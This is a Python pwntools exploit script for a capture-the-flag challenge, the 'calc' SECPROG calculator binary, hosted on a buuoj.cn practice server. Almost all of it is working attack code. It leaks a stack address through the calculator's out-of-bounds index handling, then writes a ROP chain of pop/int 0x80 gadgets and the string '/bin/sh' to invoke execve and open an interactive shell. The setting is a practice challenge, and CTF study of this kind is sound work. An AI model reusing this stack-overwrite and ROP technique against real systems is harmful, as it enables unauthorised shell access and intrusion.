# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './calc'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)

else:
    host = 'node4.buuoj.cn'
    port = '25053'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 10))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(payload):
    sla('\n' , payload)

# one_gad = one_gadget(libc.path)

def attack():
    
    # execve 只能是 /bin/sh\x00

    syscall = elf.search(asm('int 0x80')).next()
    pop_eax_ret = elf.search(asm('pop eax;ret')).next()
    pop_edx_ecx_ebx_ret = elf.search(asm('pop edx ; pop ecx ; pop ebx ; ret')).next()

    ru('=== Welcome to SECPROG calculator ===')
    sl('+360')
    ru('-')
    ebp = 0xffffffff - rint(7) + 1
    stack_addr = ebp 
    
    rop_chain = [
        pop_edx_ecx_ebx_ret,
        0,
        0,
        stack_addr,
        pop_eax_ret,
        0xb,
        syscall
    ]

    lg('pop_edx_ecx_ebx_ret',pop_edx_ecx_ebx_ret)

    cmd( '+361+' + str(0x26d37) )

    cmd( '+362-' + str(0x26d37) )
    cmd( '+363-' + str(0x26d37) )

    cmd( '+364+' + str(stack_addr/2 - 0x26d37 ) )
    cmd( '+364+' + str(stack_addr/2 ) )

    cmd( '+365-' + str(stack_addr/2 ) )
    cmd( '+365+' + str(pop_eax_ret) )

    cmd( '+366-' + str(pop_eax_ret&0xfffffff0) )

    cmd( '+367-' + str(pop_eax_ret&0xfffffff0) )
    cmd( '+367+' + str(syscall) )

    cmd( '+368-' + str(syscall) )
    cmd( '+368+' + str(0x6e69622f) )

    cmd( '+369-' + str(0x6e69622f) )
    cmd( '+369+' + str(0x68732f) )

    cmd('\n')
    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   calc.py
@Time    :   2022/02/06 23:14:52
@Author  :   Niyah 
'''
